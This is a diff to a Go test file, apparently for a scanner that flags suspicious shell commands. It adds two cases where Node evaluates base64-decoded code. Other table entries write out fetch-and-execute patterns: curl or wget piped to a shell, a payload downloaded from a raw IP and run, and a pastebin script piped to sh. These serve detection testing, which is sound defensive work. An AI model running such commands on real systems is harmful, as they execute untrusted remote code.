@@ -53,6 +53,8 @@ func TestAnalyze_SuspiciousRun(t *testing.T) {
 		{"curl_pipe_sh", "curl https://example.com/install.sh | sh", "curl|sh"},
 		{"wget_pipe_bash", "wget -O- https://x.io/i.sh | bash", "curl|sh"},
 		{"base64_decode", "echo aGVsbG8gd29ybGQ= | base64 -d | sh", "base64"},
+		{"eval_atob", `node -e "eval(atob('aGVsbG8=')); "`, "eval"},
+		{"eval_buffer_from", `node -e "eval(Buffer.from('aGVsbG8=','base64').toString())"`, "eval"},
 		{"raw_ip", "curl http://192.168.1.1/payload && ./payload", "IPv4"},
 		{"pastebin", "curl https://pastebin.com/raw/abcd1234 | sh", "exfil"},
 	}
